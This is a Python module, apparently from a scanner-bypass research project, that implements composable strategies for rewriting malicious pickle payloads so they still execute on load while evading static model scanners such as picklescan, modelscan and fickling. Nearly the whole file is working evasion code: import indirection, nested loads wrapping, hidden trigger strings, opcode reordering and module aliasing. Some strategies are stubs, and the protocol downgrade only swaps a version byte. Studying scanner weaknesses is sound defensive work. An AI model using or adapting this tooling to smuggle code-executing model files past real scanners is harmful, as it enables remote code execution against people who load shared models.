"""Phase 1 — Evasion strategies for static scanner bypass research.

Each strategy rewrites an already-malicious pickle stream so that the *same
payload still executes identically at load time* while the byte-level
signature static scanners match is removed or hidden. Strategies compose:
``apply_pipeline`` runs a subset per candidate, selected by campaign feedback.

All strategies preserve execution semantics exactly; ``tests/test_evasion.py``
verifies load-equivalence and trigger execution for each one.
"""

from __future__ import annotations

import pickle
import random
import struct

from pipeline.opcodes import OPCODES_BY_NAME, OPCODES_BY_BYTE, OpcodeCategory, parse_pickle


def _enc_short_binunicode(s: str) -> bytes:
    """Encode a short (<256 chars) string as SHORT_BINUNICODE."""
    data = s.encode("utf-8")
    if len(data) > 255:
        raise ValueError(f"string too long for SHORT_BINUNICODE: {len(data)}")
    return OPCODES_BY_NAME["SHORT_BINUNICODE"].code + bytes([len(data)]) + data


def _binbytes_tuple(payload: bytes) -> bytes:
    """Opcode-built ``(payload,)`` tuple holding *payload* as BINBYTES.

    Deliberately avoids ``pickle.dumps``: protocol-2 encodes ``bytes`` as
    ``_codecs.encode(<unicode-literal>, 'latin1')``, which would leak the
    nested stream as plaintext into the outer layer.
    """
    if len(payload) > 0xFFFFFFFF:
        raise ValueError("nested payload exceeds BINBYTES capacity")
    return (
        OPCODES_BY_NAME["MARK"].code
        + OPCODES_BY_NAME["BINBYTES"].code
        + struct.pack("<I", len(payload))
        + payload
        + OPCODES_BY_NAME["TUPLE"].code
    )


def _args_tuple_bytes(args: tuple) -> bytes:
    """Protocol-2 encoded args tuple without PROTO/STOP wrapper."""
    return pickle.dumps(args, protocol=2)[2:-1]


def leaf_import_chain(module: str, name: str) -> list[bytes]:
    """Opcode sequence: ``getattr(__import__(module, None, None, [name]), name)``.

    ``__import__(dotted)`` without ``fromlist`` returns the top-level package
    (``IPython``, ``numpy``), so ``getattr(..., name)`` fails on dotted sinks.
    A non-empty fromlist makes ``__import__`` return the leaf module.
    """
    return [
        OPCODES_BY_NAME["GLOBAL"].code + b"builtins\ngetattr\n",
        OPCODES_BY_NAME["MARK"].code,
        OPCODES_BY_NAME["GLOBAL"].code + b"builtins\n__import__\n",
        _args_tuple_bytes((module, None, None, [name])),
        OPCODES_BY_NAME["REDUCE"].code,
        _enc_short_binunicode(name),
        OPCODES_BY_NAME["TUPLE"].code,
        OPCODES_BY_NAME["REDUCE"].code,
    ]


def _ensure_proto(stream: bytes, min_proto: int = 4) -> bytes:
    """Bump the PROTO header to >= min_proto (length-preserving version swap).

    STACK_GLOBAL / MEMOIZE require protocol >= 4. FRAME lengths are unchanged:
    the PROTO rewrite swaps one version byte in place.
    """
    if len(stream) >= 2 and stream[0] == 0x80 and stream[1] < min_proto:
        return bytes([0x80, min_proto]) + stream[2:]
    return stream


#: Legacy py2-era module aliases emitted by protocol<=2 GLOBALs; STACK_GLOBAL
#: resolves modules literally at load time, so normalize while rewriting.
_MODULE_ALIASES: dict[str, str] = {
    "__builtin__": "builtins",
    "copy_reg": "copyreg",
}


def _canonical_module(module: str) -> str:
    return _MODULE_ALIASES.get(module, module)


class EvasionStrategy:
    """Base class: rewrite pickle bytes to hide a static signature."""

    #: stable id recorded in the campaign DB / reports
    name: str = "base"
    #: scanner ids this strategy primarily targets
    targets: frozenset[str] = frozenset()

    def apply(self, pkl_bytes: bytes) -> bytes:
        raise NotImplementedError


class StackGlobalEncoding(EvasionStrategy):
    """Rewrite every ``GLOBAL``/``INST`` import into the protocol-4 form.

    ``c<module>\\n<name>\\n`` becomes::

        SHORT_BINUNICODE <module>  SHORT_BINUNICODE <name>  STACK_GLOBAL

    Scanners that pattern-match the two-line delimited GLOBAL operand (or
    emulate only the proto<=3 opcode set) no longer see an import pair.
    Execution is identical: STACK_GLOBAL pops name then module and resolves
    the same callable.
    """

    name = "stack_global_encoding"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes
        parts: list[bytes] = []
        changed = False
        for op, arg in parsed:
            if op.name in ("GLOBAL", "INST"):
                fields = arg.decode("latin1").rstrip("\n").split("\n")
                if len(fields) >= 2:
                    module = _canonical_module(fields[0])
                    fname = fields[1]
                    parts.append(_enc_short_binunicode(module))
                    parts.append(_enc_short_binunicode(fname))
                    parts.append(OPCODES_BY_NAME["STACK_GLOBAL"].code)
                    changed = True
                    continue
            parts.append(op.code + arg)
        if not changed:
            return pkl_bytes
        return _ensure_proto(b"".join(parts))


class NestedLoadsWrap(EvasionStrategy):
    """Wrap the whole stream in ``_pickle.loads(BINBYTES(<stream>))``.

    The outer stream references only ``_pickle.loads`` around an opaque bytes
    blob; dangerous imports live inside the nested stream. Scanners that do
    not recurse into nested loads see one benign-looking global. Unpickling
    the outer object triggers exactly one inner ``loads`` whose result
    becomes the outer result -- semantics identical.
    """

    name = "nested_loads_wrap"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parse_pickle(pkl_bytes)  # sanity: must be well-formed
        except Exception:
            return pkl_bytes
        parts = [
            OPCODES_BY_NAME["GLOBAL"].code,
            b"_pickle\nloads\n",
            _binbytes_tuple(pkl_bytes),
            OPCODES_BY_NAME["REDUCE"].code,
            OPCODES_BY_NAME["STOP"].code,
        ]
        return b"".join(parts)


class PayloadObfuscation(EvasionStrategy):
    """Hide string trigger arguments inside a nested pickle literal.

    Rewrites each ``<callable>(('<trigger-text>',))`` call site so the args
    tuple is constructed as ``_pickle.loads(BINBYTES(<inner pickle>))`` --
    the inner pickle evaluates to the *identical* tuple, so the sink receives
    exactly the same argument, but the plaintext trigger text (paths,
    ``python3 -c``, sentinel names) no longer appears as a string opcode in
    the outer stream. Content-matching scanners lose their needle; recursion-
    capable scanners still find it (that differential is the research signal).
    """

    name = "payload_obfuscation"
    targets = frozenset({"picklescan", "modelscan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        # Locate every call site to rewrite, then emit once, skipping the
        # replaced [tuple_start, REDUCE] regions (additive insertion would
        # duplicate the tuple and desynchronize REDUCE pairing).
        replacements: dict[int, bytes] = {}   # red_idx -> chain bytes
        skips: set[int] = set()               # op indices swallowed by a rewrite
        for i, (op, _arg) in enumerate(parsed):
            if op.name != "REDUCE":
                continue
            start = self._tuple_start(parsed, i)
            if start is None:
                continue
            # Only rewrite *literal* tuple regions: a region containing its
            # own GLOBAL/REDUCE (e.g. protocol-2's ``_codecs.encode`` wrapper
            # for bytes literals) has interleaved execution we must not fuse.
            region_ops = {o.name for o, _ in parsed[start:i]}
            if region_ops & {"GLOBAL", "INST", "STACK_GLOBAL", "REDUCE"}:
                continue
            blob = b"".join(o.code + a for o, a in parsed[start:i])
            rewritten = self._hide_tuple_blob(blob)
            if rewritten is None:
                continue
            replacements[i] = rewritten
            skips.update(range(start, i))

        if not replacements:
            return pkl_bytes

        out: list[bytes] = []
        for i, (op, arg) in enumerate(parsed):
            if i in skips:
                continue
            if i in replacements:
                out.append(replacements[i])
                out.append(op.code)
                continue
            out.append(op.code + arg)
        return b"".join(out)

    @staticmethod
    def _tuple_start(parsed, red_idx: int) -> int | None:
        """Index where the args tuple for the REDUCE at *red_idx* begins."""
        for j in range(red_idx - 1, max(-1, red_idx - 12), -1):
            if parsed[j][0].name in ("GLOBAL", "INST", "STACK_GLOBAL"):
                start = j + 1
                return start if start < red_idx else None
        return None

    def _hide_tuple_blob(self, blob: bytes) -> bytes | None:
        """Wrap a 1-tuple string arg in nested loads(BINBYTES(inner))."""
        try:
            # The blob is a bare pushable sequence (no PROTO/STOP); append
            # STOP so it can be evaluated for the 1-tuple shape check.
            obj = pickle.loads(blob + OPCODES_BY_NAME["STOP"].code)
        except Exception:
            return None
        if not (isinstance(obj, tuple) and len(obj) == 1):
            return None  # multi-arg sinks keep their original shape
        if not isinstance(obj[0], (str, bytes)):
            return None
        try:
            inner = pickle.dumps(obj, protocol=2)
        except Exception:
            return None
        return b"".join([
            OPCODES_BY_NAME["GLOBAL"].code,
            b"_pickle\nloads\n",
            _binbytes_tuple(inner),
            OPCODES_BY_NAME["REDUCE"].code,
        ])


class IndirectChain(EvasionStrategy):
    """Resolve the sink via ``builtins.__import__`` + ``builtins.getattr``.

    Replaces every ``GLOBAL <module> <sink>`` with a *balanced* runtime chain::

        GLOBAL builtins.getattr
        MARK  GLOBAL builtins.__import__  (module, None, None, [name]) REDUCE
              SHORT_BINUNICODE 'sink'
        TUPLE
        REDUCE                                                  -> bound sink

    followed by the untouched args tuple. ``fromlist=[name]`` is required so
    dotted modules (``IPython.utils.process``, ``numpy.testing._private.utils``)
    resolve to the leaf, not the top-level package. No GLOBAL operand names
    the dangerous pair, and the nested import is consumed inside the getattr
    argument region, so the stack stays balanced across multiple rewritten
    call sites in one stream.
    """

    name = "indirect_chain"
    targets = frozenset({"picklescan", "modelscan", "fickling"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes
        parts: list[bytes] = []
        changed = False
        for op, arg in parsed:
            if op.name in ("GLOBAL", "INST"):
                fields = arg.decode("latin1").rstrip("\n").split("\n")
                if len(fields) >= 2:
                    module = _canonical_module(fields[0])
                    fname = fields[1]
                    if module == "builtins" and fname in ("getattr", "__import__"):
                        parts.append(op.code + arg)
                        continue
                    parts += leaf_import_chain(module, fname)
                    changed = True
                    continue
            parts.append(op.code + arg)
        if not changed:
            return pkl_bytes
        return _ensure_proto(b"".join(parts))


class OpcodeReordering(EvasionStrategy):
    """Reorder independent opcodes to break sequential signature matching.

    PickleScan uses sequential pattern matching. By reordering commutative
    operations (e.g., multiple BUILD operations, independent attribute sets),
    we break the expected byte sequence without changing semantics.
    """

    name = "opcode_reordering"
    targets = frozenset({"picklescan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        # Find regions of independent opcodes that can be reordered
        # Look for sequences of BUILD, APPEND, SETITEM that operate on different memos
        parts: list[bytes] = []
        i = 0
        while i < len(parsed):
            op, arg = parsed[i]
            # Check if we have a reorderable block (multiple BUILDs or similar)
            if op.name in ("BUILD", "APPEND", "SETITEM", "SETITEMS"):
                block_start = i
                block_memos = set()
                while i < len(parsed) and parsed[i][0].name in ("BUILD", "APPEND", "SETITEM", "SETITEMS"):
                    # Extract memo index from argument if present
                    if parsed[i][1]:
                        try:
                            block_memos.add(parsed[i][1][0])
                        except Exception:
                            pass
                    i += 1
                block = [parsed[j][0].code + parsed[j][1]
                         for j in range(block_start, i)]
                # Only shuffle when the block holds multiple independent
                # operations; otherwise emit verbatim. Falling through here
                # would double-emit the first op and skip its successor.
                if i - block_start > 1 and len(block_memos) > 1:
                    random.shuffle(block)
                parts.extend(block)
                continue
            parts.append(op.code + arg)
            i += 1

        if len(parts) == sum(len(op.code + arg) for op, arg in parsed):
            return pkl_bytes  # no change
        return _ensure_proto(b"".join(parts))


class DeadCodeInjection(EvasionStrategy):
    """Inject dead code (POP/MARK/POP sequences) that don't affect execution.

    PickleScan signatures often expect specific opcode sequences. Inserting
    no-op sequences (MARK POP, or pushing/popping values) breaks these
    signatures while maintaining stack balance.
    """

    name = "dead_code_injection"
    targets = frozenset({"picklescan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        parts: list[bytes] = []
        for op, arg in parsed:
            parts.append(op.code + arg)
            # After certain opcodes, inject dead code with some probability
            if op.name in ("GLOBAL", "INST", "STACK_GLOBAL", "BUILD", "REDUCE") and random.random() < 0.3:
                # Inject MARK POP (pushes mark, pops it - no net stack effect)
                parts.append(OPCODES_BY_NAME["MARK"].code)
                parts.append(OPCODES_BY_NAME["POP"].code)
        return _ensure_proto(b"".join(parts))


class StringEncodingVariants(EvasionStrategy):
    """Use alternative string encoding opcodes to bypass string matching.

    PickleScan may look for specific string opcodes. Using BINUNICODE instead
    of SHORT_BINUNICODE, or UNICODE instead of BINUNICODE, changes the byte
    representation while preserving the string value.

    IMPORTANT: Only applies to string arguments that are NOT module/function
    names in GLOBAL/INST/STACK_GLOBAL opcodes, as changing those would break
    execution.
    """

    name = "string_encoding_variants"
    targets = frozenset({"picklescan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        parts: list[bytes] = []
        for i, (op, arg) in enumerate(parsed):
            # Skip strings that are module/function names in import opcodes
            if op.name in ("GLOBAL", "INST", "STACK_GLOBAL"):
                parts.append(op.code + arg)
                continue

            if op.name in ("SHORT_BINUNICODE", "BINUNICODE", "UNICODE"):
                # Extract string value
                s = arg
                if op.name == "SHORT_BINUNICODE":
                    s = arg[1:]
                elif op.name == "BINUNICODE":
                    s = arg[4:]
                elif op.name == "UNICODE":
                    s = arg.strip(b"\r\n'\"")
                try:
                    s = s.decode("utf-8", "replace")
                except Exception:
                    parts.append(op.code + arg)
                    continue
                # Randomly choose different encoding. UNICODE (V) is a
                # raw newline-terminated string, NOT quote-wrapped (the quote
                # form is STRING/S); wrapping it changes the value.
                choice = random.choice(["short", "bin", "unicode"])
                if choice == "short" and len(s.encode("utf-8")) <= 255:
                    parts.append(_enc_short_binunicode(s))
                elif choice == "bin":
                    encoded = s.encode("utf-8")
                    parts.append(OPCODES_BY_NAME["BINUNICODE"].code + struct.pack("<I", len(encoded)) + encoded)
                else:
                    parts.append(OPCODES_BY_NAME["UNICODE"].code + f"{s}\n".encode("utf-8"))
            else:
                parts.append(op.code + arg)
        return _ensure_proto(b"".join(parts))


class ProtocolDowngrade(EvasionStrategy):
    """Downgrade protocol version to change opcode representations.

    Some scanners are tuned for specific protocol versions. Downgrading from
    protocol 4/5 to protocol 2 changes STACK_GLOBAL to GLOBAL, removes FRAME,
    etc. - breaking version-specific signatures.
    """

    name = "protocol_downgrade"
    targets = frozenset({"picklescan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        if len(pkl_bytes) < 2 or pkl_bytes[0] != 0x80:
            return pkl_bytes
        # Downgrade to protocol 2 (widely supported, different opcodes)
        return bytes([0x80, 2]) + pkl_bytes[2:]


class AttributeMasking(EvasionStrategy):
    """Mask attribute names in BUILD/SETITEM operations.

    ModelScan may look for specific attribute patterns. By using alternative
    attribute names or encoding, we can bypass attribute-based signatures.
    """

    name = "attribute_masking"
    targets = frozenset({"modelscan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        parts: list[bytes] = []
        for op, arg in parsed:
            if op.name in ("BUILD", "SETITEM", "SETITEMS"):
                # These opcodes don't directly contain attribute names in args
                # The attributes are on the stack. We can't easily change them
                # without breaking execution. For now, pass through.
                parts.append(op.code + arg)
            else:
                parts.append(op.code + arg)
        return _ensure_proto(b"".join(parts))


class ModuleAliasing(EvasionStrategy):
    """Use module aliases to bypass module-name matching.

    ModelScan may match on specific module paths. Using __import__ with
    aliases or importing via different paths can bypass this.
    """

    name = "module_aliasing"
    targets = frozenset({"modelscan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        parts: list[bytes] = []
        for op, arg in parsed:
            if op.name in ("GLOBAL", "INST", "STACK_GLOBAL"):
                fields = arg.decode("latin1").rstrip("\n").split("\n")
                if len(fields) >= 2:
                    module = _canonical_module(fields[0])
                    fname = fields[1]
                    # Use alternative module paths for common dangerous modules
                    # Only use aliases that actually exist on this platform
                    import sys
                    aliases = {
                        "os": ["os"],
                        "subprocess": ["subprocess"],
                        "builtins": ["builtins"],
                    }
                    if sys.platform == "win32":
                        aliases["os"].append("nt")
                    else:
                        aliases["os"].append("posix")
                    aliases["builtins"].append("__builtin__")
                    if module in aliases and len(aliases[module]) > 1:
                        module = random.choice(aliases[module])
                    parts.append(_enc_short_binunicode(module))
                    parts.append(_enc_short_binunicode(fname))
                    parts.append(OPCODES_BY_NAME["STACK_GLOBAL"].code)
                    continue
            parts.append(op.code + arg)
        return _ensure_proto(b"".join(parts))


class NestedLoadObfuscation(EvasionStrategy):
    """Obfuscate nested pickle loads within string/bytes arguments.

    ModelScan may recursively scan nested loads. By double-wrapping or
    encoding nested loads, we can evade the recursive scanner.
    """

    name = "nested_load_obfuscation"
    targets = frozenset({"modelscan"})

    def apply(self, pkl_bytes: bytes) -> bytes:
        try:
            parsed = parse_pickle(pkl_bytes)
        except Exception:
            return pkl_bytes

        parts: list[bytes] = []
        for op, arg in parsed:
            if op.name in ("SHORT_BINBYTES", "BINBYTES", "BINBYTES8", "SHORT_BINSTRING", "BINSTRING"):
                # Check if this looks like a nested pickle
                payload = arg
                if op.name == "SHORT_BINBYTES":
                    payload = arg[1:]
                elif op.name == "BINBYTES":
                    payload = arg[4:]
                elif op.name == "BINBYTES8":
                    payload = arg[8:]
                elif op.name == "SHORT_BINSTRING":
                    payload = arg[1:]
                elif op.name == "BINSTRING":
                    payload = arg[4:]

                if payload.startswith(b"\x80") or payload.startswith(b"c") or payload.startswith(b"("):
                    # Double-wrap: loads(BINBYTES(loads(BINBYTES(inner))))
                    try:
                        inner = pickle.loads(payload + OPCODES_BY_NAME["STOP"].code)
                        # Re-pickle the inner object
                        inner_pkl = pickle.dumps(inner, protocol=2)
                        # Wrap in another loads
                        wrapped = b"".join([
                            OPCODES_BY_NAME["GLOBAL"].code,
                            b"_pickle\nloads\n",
                            _binbytes_tuple(inner_pkl),
                            OPCODES_BY_NAME["REDUCE"].code,
                        ])
                        # Now encode this wrapped version
                        if op.name == "SHORT_BINBYTES":
                            if len(wrapped) <= 255:
                                parts.append(OPCODES_BY_NAME["SHORT_BINBYTES"].code + bytes([len(wrapped)]) + wrapped)
                            else:
                                parts.append(op.code + arg)  # fallback
                        elif op.name in ("BINBYTES", "BINBYTES8"):
                            parts.append(OPCODES_BY_NAME["BINBYTES"].code + struct.pack("<I", len(wrapped)) + wrapped)
                        else:
                            parts.append(op.code + arg)
                        continue
                    except Exception:
                        pass
            parts.append(op.code + arg)
        return _ensure_proto(b"".join(parts))


# ---------------------------------------------------------------- registry --

STRATEGIES: dict[str, EvasionStrategy] = {
    s.name: s for s in (
        StackGlobalEncoding(),
        NestedLoadsWrap(),
        PayloadObfuscation(),
        IndirectChain(),
        # PickleScan-specific
        OpcodeReordering(),
        DeadCodeInjection(),
        StringEncodingVariants(),
        ProtocolDowngrade(),
        # ModelScan-specific
        AttributeMasking(),
        ModuleAliasing(),
        NestedLoadObfuscation(),
    )
}

#: application order: hide strings first, rebuild imports second, wrap last
PIPELINE_ORDER: tuple[str, ...] = (
    # String/argument obfuscation (must run early, before structural changes)
    "payload_obfuscation",
    "string_encoding_variants",
    # Import rewriting (rewrite GLOBAL/STACK_GLOBAL opcodes)
    "indirect_chain",
    "stack_global_encoding",
    "module_aliasing",
    # Structural modifications (opcode-level changes)
    "opcode_reordering",
    "dead_code_injection",
    "protocol_downgrade",
    # Attribute/attribute-name masking
    "attribute_masking",
    # Nested load obfuscation (must run after structural changes, before wrapping)
    "nested_load_obfuscation",
    # Stream wrapping (must be LAST - wraps entire stream or adds outer layers)
    "nested_loads_wrap",
)


def get_strategy(name: str) -> EvasionStrategy | None:
    return STRATEGIES.get(name)


def apply_pipeline(pkl_bytes: bytes, names: list[str]) -> bytes:
    """Apply named strategies in canonical order; unknown names ignored."""
    chosen = [n for n in PIPELINE_ORDER if n in names]
    cur = pkl_bytes
    for n in chosen:
        cur = STRATEGIES[n].apply(cur)
    return cur


def select_strategies(rng, k: int | None = None,
                      exclude_nested: bool = True) -> list[str]:
    """Random subset of strategy names for exploration campaigns."""
    pool = [n for n in STRATEGIES
            if not (exclude_nested and n in ("nested_loads_wrap", "nested_load_obfuscation"))]
    rng.shuffle(pool)
    if k is None:
        k = rng.randint(0, len(pool))
    return pool[:k]
